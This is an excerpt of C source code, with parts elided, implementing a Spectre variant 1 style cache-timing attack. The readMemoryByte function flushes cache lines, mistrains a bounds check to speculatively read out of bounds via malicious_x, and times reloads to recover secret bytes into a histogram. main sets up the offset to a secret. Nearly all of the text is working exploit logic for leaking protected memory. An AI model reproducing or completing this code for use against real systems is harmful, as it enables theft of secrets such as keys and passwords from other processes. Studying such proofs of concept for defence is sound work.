...
void readMemoryByte(size_t malicious_x, int histogram[256]) {
    ...
    for (tries = 0; tries < 100; tries++) {
        // flush step: clear all cache lines in array2
        for (i = 0; i < 256; i++)
            flush(&array2[i * 512]);
        asm volatile("mfence\nlfence\n");
        ...
        for (j = 58; j >= 0; j--) {
            // flush array1_size 3x to slow down bounds check
            flush(&array1_size);
            flush(&array1_size);
            flush(&array1_size);
            asm volatile("mfence\nlfence\n");

            for (volatile int z = 0; z < 95; z++) {}

            // branchless way to pick training_x or malicious_x based on j%7
            x = ((j % 7) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
        ...
        // reload step: shuffle accesses to beat prefetcher
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;

            // skip array1 values that might already be cached
        ...
        // cache hit if under 115 cycles
        if (min_time < 115 && min_idx != -1) {
            histogram[min_idx]++;
        }
    }
}
...
int main()
{
    // init array2 to non-zero before flush/reload
    ...
    // get offset from array1 to secret
